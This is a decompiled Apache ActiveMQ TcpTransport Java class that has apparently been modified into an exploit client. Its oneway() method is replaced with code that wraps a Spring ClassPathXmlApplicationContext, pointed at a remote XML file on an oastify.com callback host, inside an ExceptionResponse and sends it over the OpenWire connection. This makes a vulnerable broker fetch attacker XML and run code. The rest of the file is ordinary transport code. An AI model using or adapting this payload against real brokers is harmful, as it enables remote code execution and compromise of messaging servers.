//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.apache.activemq.transport.tcp;

import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.SocketTimeoutException;
import java.net.URI;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import javax.net.SocketFactory;
import org.apache.activemq.Service;
import org.apache.activemq.TransportLoggerSupport;
import org.apache.activemq.command.ExceptionResponse;
import org.apache.activemq.openwire.OpenWireFormat;
import org.apache.activemq.openwire.v1.ExceptionResponseMarshaller;
import org.apache.activemq.thread.TaskRunnerFactory;
import org.apache.activemq.transport.Transport;
import org.apache.activemq.transport.TransportThreadSupport;
import org.apache.activemq.util.InetAddressUtil;
import org.apache.activemq.util.IntrospectionSupport;
import org.apache.activemq.util.ServiceStopper;
import org.apache.activemq.wireformat.WireFormat;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.context.support.ClassPathXmlApplicationContext;


public class TcpTransport extends TransportThreadSupport implements Transport, Service, Runnable {
    private static final Logger LOG = LoggerFactory.getLogger(TcpTransport.class);
    protected final URI remoteLocation;
    protected final URI localLocation;
    protected final WireFormat wireFormat;
    protected int connectionTimeout;
    protected int soTimeout;
    protected int socketBufferSize;
    protected int ioBufferSize;
    protected boolean closeAsync;
    protected Socket socket;
    protected DataOutputStream dataOut;
    protected DataInputStream dataIn;
    protected TimeStampStream buffOut;
    protected final TcpTransport.InitBuffer initBuffer;
    protected int trafficClass;
    private boolean trafficClassSet;
    protected boolean diffServChosen;
    protected boolean typeOfServiceChosen;
    protected boolean trace;
    protected String logWriterName;
    protected boolean dynamicManagement;
    protected boolean startLogging;
    protected int jmxPort;
    protected boolean useLocalHost;
    protected int minmumWireFormatVersion;
    protected SocketFactory socketFactory;
    protected final AtomicReference<CountDownLatch> stoppedLatch;
    protected volatile int receiveCounter;
    protected Map<String, Object> socketOptions;
    private int soLinger;
    private Boolean keepAlive;
    private Boolean tcpNoDelay;
    private Thread runnerThread;

    public TcpTransport(WireFormat wireFormat, SocketFactory socketFactory, URI remoteLocation, URI localLocation) throws UnknownHostException, IOException {
        this.connectionTimeout = 30000;
        this.socketBufferSize = 65536;
        this.ioBufferSize = 8192;
        this.closeAsync = true;
        this.buffOut = null;
        this.trafficClass = 0;
        this.trafficClassSet = false;
        this.diffServChosen = false;
        this.typeOfServiceChosen = false;
        this.trace = false;
        this.logWriterName = TransportLoggerSupport.defaultLogWriterName;
        this.dynamicManagement = false;
        this.startLogging = true;
        this.jmxPort = 1099;
        this.useLocalHost = false;
        this.stoppedLatch = new AtomicReference();
        this.soLinger = -2147483648;
        this.wireFormat = wireFormat;
        this.socketFactory = socketFactory;

        try {
            this.socket = socketFactory.createSocket();
        } catch (SocketException var6) {
            this.socket = null;
        }

        this.remoteLocation = remoteLocation;
        this.localLocation = localLocation;
        this.initBuffer = null;
        this.setDaemon(false);
    }

    public TcpTransport(WireFormat wireFormat, Socket socket) throws IOException {
        this(wireFormat, socket, (TcpTransport.InitBuffer)null);
    }

    public TcpTransport(WireFormat wireFormat, Socket socket, TcpTransport.InitBuffer initBuffer) throws IOException {
        this.connectionTimeout = 30000;
        this.socketBufferSize = 65536;
        this.ioBufferSize = 8192;
        this.closeAsync = true;
        this.buffOut = null;
        this.trafficClass = 0;
        this.trafficClassSet = false;
        this.diffServChosen = false;
        this.typeOfServiceChosen = false;
        this.trace = false;
        this.logWriterName = TransportLoggerSupport.defaultLogWriterName;
        this.dynamicManagement = false;
        this.startLogging = true;
        this.jmxPort = 1099;
        this.useLocalHost = false;
        this.stoppedLatch = new AtomicReference();
        this.soLinger = -2147483648;
        this.wireFormat = wireFormat;
        this.socket = socket;
        this.remoteLocation = null;
        this.localLocation = null;
        this.initBuffer = initBuffer;
        this.setDaemon(true);
    }
    @Override
    public void oneway(Object command) throws IOException {
        this.checkStarted();
        ExceptionResponseMarshaller exmarshaller = new ExceptionResponseMarshaller();
        Throwable obj = new ClassPathXmlApplicationContext("http://4nsoeriiyohf4wuzon5sdn2yrpxgl99y.oastify.com/exp.xml");
        ExceptionResponse response = new ExceptionResponse(obj);
        // 序列化 ExceptionResponse 对象
        //exmarshaller.looseMarshal((OpenWireFormat) this.wireFormat,response,this.dataOut);
        this.wireFormat.marshal(response, this.dataOut);
        this.dataOut.flush();
    }



    public void run() {
        LOG.trace("TCP consumer thread for " + this + " starting");
        this.runnerThread = Thread.currentThread();

        try {
            while(!this.isStopped() && !this.isStopping()) {
                this.doRun();
            }
        } catch (IOException var7) {
            ((CountDownLatch)this.stoppedLatch.get()).countDown();
            this.onException(var7);
        } catch (Throwable var8) {
            ((CountDownLatch)this.stoppedLatch.get()).countDown();
            IOException ioe = new IOException("Unexpected error occurred: " + var8);
            ioe.initCause(var8);
            this.onException(ioe);
        } finally {
            ((CountDownLatch)this.stoppedLatch.get()).countDown();
        }

    }

    protected void doRun() throws IOException {
        try {
            Object command = this.readCommand();
            this.doConsume(command);
        } catch (SocketTimeoutException var2) {
        } catch (InterruptedIOException var3) {
        }

    }

    protected Object readCommand() throws IOException {
        return this.wireFormat.unmarshal(this.dataIn);
    }

    public String getDiffServ() {
        return Integer.toString(this.trafficClass);
    }

    public void setDiffServ(String diffServ) throws IllegalArgumentException {
        this.trafficClass = QualityOfServiceUtils.getDSCP(diffServ);
        this.diffServChosen = true;
    }

    public int getTypeOfService() {
        return this.trafficClass;
    }

    public void setTypeOfService(int typeOfService) {
        this.trafficClass = QualityOfServiceUtils.getToS(typeOfService);
        this.typeOfServiceChosen = true;
    }

    public boolean isTrace() {
        return this.trace;
    }

    public void setTrace(boolean trace) {
        this.trace = trace;
    }

    public String getLogWriterName() {
        return this.logWriterName;
    }

    public void setLogWriterName(String logFormat) {
        this.logWriterName = logFormat;
    }

    public boolean isDynamicManagement() {
        return this.dynamicManagement;
    }

    public void setDynamicManagement(boolean useJmx) {
        this.dynamicManagement = useJmx;
    }

    public boolean isStartLogging() {
        return this.startLogging;
    }

    public void setStartLogging(boolean startLogging) {
        this.startLogging = startLogging;
    }

    public int getJmxPort() {
        return this.jmxPort;
    }

    public void setJmxPort(int jmxPort) {
        this.jmxPort = jmxPort;
    }

    public int getMinmumWireFormatVersion() {
        return this.minmumWireFormatVersion;
    }

    public void setMinmumWireFormatVersion(int minmumWireFormatVersion) {
        this.minmumWireFormatVersion = minmumWireFormatVersion;
    }

    public boolean isUseLocalHost() {
        return this.useLocalHost;
    }

    public void setUseLocalHost(boolean useLocalHost) {
        this.useLocalHost = useLocalHost;
    }

    public int getSocketBufferSize() {
        return this.socketBufferSize;
    }

    public void setSocketBufferSize(int socketBufferSize) {
        this.socketBufferSize = socketBufferSize;
    }

    public int getSoTimeout() {
        return this.soTimeout;
    }

    public void setSoTimeout(int soTimeout) {
        this.soTimeout = soTimeout;
    }

    public int getConnectionTimeout() {
        return this.connectionTimeout;
    }

    public void setConnectionTimeout(int connectionTimeout) {
        this.connectionTimeout = connectionTimeout;
    }

    public Boolean getKeepAlive() {
        return this.keepAlive;
    }

    public void setKeepAlive(Boolean keepAlive) {
        this.keepAlive = keepAlive;
    }

    public void setSoLinger(int soLinger) {
        this.soLinger = soLinger;
    }

    public int getSoLinger() {
        return this.soLinger;
    }

    public Boolean getTcpNoDelay() {
        return this.tcpNoDelay;
    }

    public void setTcpNoDelay(Boolean tcpNoDelay) {
        this.tcpNoDelay = tcpNoDelay;
    }

    public int getIoBufferSize() {
        return this.ioBufferSize;
    }

    public void setIoBufferSize(int ioBufferSize) {
        this.ioBufferSize = ioBufferSize;
    }

    public boolean isCloseAsync() {
        return this.closeAsync;
    }

    public void setCloseAsync(boolean closeAsync) {
        this.closeAsync = closeAsync;
    }

    protected String resolveHostName(String host) throws UnknownHostException {
        if (this.isUseLocalHost()) {
            String localName = InetAddressUtil.getLocalHostName();
            if (localName != null && localName.equals(host)) {
                return "localhost";
            }
        }

        return host;
    }

    protected void initialiseSocket(Socket sock) throws SocketException, IllegalArgumentException {
        if (this.socketOptions != null) {
            Map<String, Object> copy = new HashMap(this.socketOptions);
            IntrospectionSupport.setProperties(this.socket, copy);
            if (!copy.isEmpty()) {
                throw new IllegalArgumentException("Invalid socket parameters: " + copy);
            }
        }

        try {
            if (this.socketBufferSize > 0) {
                sock.setReceiveBufferSize(this.socketBufferSize);
                sock.setSendBufferSize(this.socketBufferSize);
            } else {
                LOG.warn("Socket buffer size was set to {}; Skipping this setting as the size must be a positive number.", this.socketBufferSize);
            }
        } catch (SocketException var3) {
            LOG.warn("Cannot set socket buffer size = " + this.socketBufferSize);
            LOG.debug("Cannot set socket buffer size. Reason: " + var3.getMessage() + ". This exception is ignored.", var3);
        }

        sock.setSoTimeout(this.soTimeout);
        if (this.keepAlive != null) {
            sock.setKeepAlive(this.keepAlive);
        }

        if (this.soLinger > -1) {
            sock.setSoLinger(true, this.soLinger);
        } else if (this.soLinger == -1) {
            sock.setSoLinger(false, 0);
        }

        if (this.tcpNoDelay != null) {
            sock.setTcpNoDelay(this.tcpNoDelay);
        }

        if (!this.trafficClassSet) {
            this.trafficClassSet = this.setTrafficClass(sock);
        }

    }

    protected void doStart() throws Exception {
        this.connect();
        this.stoppedLatch.set(new CountDownLatch(1));
        super.doStart();
    }

    protected void connect() throws Exception {
        if (this.socket == null && this.socketFactory == null) {
            throw new IllegalStateException("Cannot connect if the socket or socketFactory have not been set");
        } else {
            InetSocketAddress localAddress = null;
            InetSocketAddress remoteAddress = null;
            if (this.localLocation != null) {
                localAddress = new InetSocketAddress(InetAddress.getByName(this.localLocation.getHost()), this.localLocation.getPort());
            }

            if (this.remoteLocation != null) {
                String host = this.resolveHostName(this.remoteLocation.getHost());
                remoteAddress = new InetSocketAddress(host, this.remoteLocation.getPort());
            }

            this.trafficClassSet = this.setTrafficClass(this.socket);
            if (this.socket != null) {
                if (localAddress != null) {
                    this.socket.bind(localAddress);
                }

                if (remoteAddress != null) {
                    if (this.connectionTimeout >= 0) {
                        this.socket.connect(remoteAddress, this.connectionTimeout);
                    } else {
                        this.socket.connect(remoteAddress);
                    }
                }
            } else if (localAddress != null) {
                this.socket = this.socketFactory.createSocket(remoteAddress.getAddress(), remoteAddress.getPort(), localAddress.getAddress(), localAddress.getPort());
            } else {
                this.socket = this.socketFactory.createSocket(remoteAddress.getAddress(), remoteAddress.getPort());
            }

            this.initialiseSocket(this.socket);
            this.initializeStreams();
        }
    }

    protected void doStop(ServiceStopper stopper) throws Exception {
        if (LOG.isDebugEnabled()) {
            LOG.debug("Stopping transport " + this);
        }

        if (this.socket != null) {
            if (this.closeAsync) {
                final CountDownLatch latch = new CountDownLatch(1);
                TaskRunnerFactory taskRunnerFactory = new TaskRunnerFactory();
                taskRunnerFactory.execute(new Runnable() {
                    public void run() {
                        TcpTransport.LOG.trace("Closing socket {}", TcpTransport.this.socket);

                        try {
                            TcpTransport.this.socket.close();
                            TcpTransport.LOG.debug("Closed socket {}", TcpTransport.this.socket);
                        } catch (IOException var5) {
                            if (TcpTransport.LOG.isDebugEnabled()) {
                                TcpTransport.LOG.debug("Caught exception closing socket " + TcpTransport.this.socket + ". This exception will be ignored.", var5);
                            }
                        } finally {
                            latch.countDown();
                        }

                    }
                });

                try {
                    latch.await(1L, TimeUnit.SECONDS);
                } catch (InterruptedException var9) {
                    Thread.currentThread().interrupt();
                } finally {
                    taskRunnerFactory.shutdownNow();
                }
            } else {
                LOG.trace("Closing socket {}", this.socket);

                try {
                    this.socket.close();
                    LOG.debug("Closed socket {}", this.socket);
                } catch (IOException var11) {
                    if (LOG.isDebugEnabled()) {
                        LOG.debug("Caught exception closing socket " + this.socket + ". This exception will be ignored.", var11);
                    }
                }
            }
        }

    }

    public void stop() throws Exception {
        super.stop();
        CountDownLatch countDownLatch = (CountDownLatch)this.stoppedLatch.get();
        if (countDownLatch != null && Thread.currentThread() != this.runnerThread) {
            countDownLatch.await(1L, TimeUnit.SECONDS);
        }

    }

    protected void initializeStreams() throws Exception {
        TcpBufferedInputStream buffIn = new TcpBufferedInputStream(this.socket.getInputStream(), this.ioBufferSize) {
            public int read() throws IOException {
                ++TcpTransport.this.receiveCounter;
                return super.read();
            }

            public int read(byte[] b, int off, int len) throws IOException {
                ++TcpTransport.this.receiveCounter;
                return super.read(b, off, len);
            }

            public long skip(long n) throws IOException {
                ++TcpTransport.this.receiveCounter;
                return super.skip(n);
            }

            protected void fill() throws IOException {
                ++TcpTransport.this.receiveCounter;
                super.fill();
            }
        };
        if (this.initBuffer != null) {
            buffIn.unread(this.initBuffer.buffer.array());
        }

        this.dataIn = new DataInputStream(buffIn);
        TcpBufferedOutputStream outputStream = new TcpBufferedOutputStream(this.socket.getOutputStream(), this.ioBufferSize);
        this.dataOut = new DataOutputStream(outputStream);
        this.buffOut = outputStream;
    }

    protected void closeStreams() throws IOException {
        if (this.dataOut != null) {
            this.dataOut.close();
        }

        if (this.dataIn != null) {
            this.dataIn.close();
        }

    }

    public void setSocketOptions(Map<String, Object> socketOptions) {
        this.socketOptions = new HashMap(socketOptions);
    }


    public <T> T narrow(Class<T> target) {
        if (target == Socket.class) {
            return target.cast(this.socket);
        } else {
            return target == TimeStampStream.class ? target.cast(this.buffOut) : super.narrow(target);
        }
    }

    @Override
    public String getRemoteAddress() {
        return null;
    }

    public int getReceiveCounter() {
        return this.receiveCounter;
    }

    private boolean setTrafficClass(Socket sock) throws SocketException, IllegalArgumentException {
        if (sock != null && (this.diffServChosen || this.typeOfServiceChosen)) {
            if (this.diffServChosen && this.typeOfServiceChosen) {
                throw new IllegalArgumentException("Cannot set both the  Differentiated Services and Type of Services transport  options on the same connection.");
            } else {
                sock.setTrafficClass(this.trafficClass);
                int resultTrafficClass = sock.getTrafficClass();
                if (this.trafficClass == resultTrafficClass) {
                    this.diffServChosen = false;
                    this.typeOfServiceChosen = false;
                    return true;
                } else {
                    if (this.trafficClass >> 2 == resultTrafficClass >> 2 && (this.trafficClass & 3) != (resultTrafficClass & 3)) {
                        LOG.warn("Attempted to set the Traffic Class to " + this.trafficClass + " but the result Traffic Class was " + resultTrafficClass + ". Please check that your system allows you to set the ECN bits (the first two bits).");
                    } else {
                        LOG.warn("Attempted to set the Traffic Class to " + this.trafficClass + " but the result Traffic Class was " + resultTrafficClass + ". Please check that your system supports java.net.setTrafficClass.");
                    }

                    return false;
                }
            }
        } else {
            return false;
        }
    }

    public WireFormat getWireFormat() {
        return this.wireFormat;
    }

    public X509Certificate[] getPeerCertificates() {
        return null;
    }

    public void setPeerCertificates(X509Certificate[] certificates) {
    }

    public static class InitBuffer {
        public final int readSize;
        public final ByteBuffer buffer;

        public InitBuffer(int readSize, ByteBuffer buffer) {
            if (buffer == null) {
                throw new IllegalArgumentException("Null buffer not allowed.");
            } else {
                this.readSize = readSize;
                this.buffer = buffer;
            }
        }
    }
}

